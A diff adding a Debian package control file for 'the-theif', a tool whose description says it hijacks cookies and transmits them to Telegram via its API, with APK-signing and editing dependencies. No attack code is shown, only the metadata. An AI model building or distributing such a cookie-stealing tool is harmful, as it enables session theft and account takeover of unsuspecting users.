@@ -1,0 +1,8 @@
+Package: the-theif
+Version: 2.1
+Architecture: all
+Maintainer: Alienkrishn [Anon4You]
+Depends: apksigner,apkeditor,python
+Installed-Size: 4842
+Description: A tool that can hijack cookies and transmit them to Telegram using the API.
+
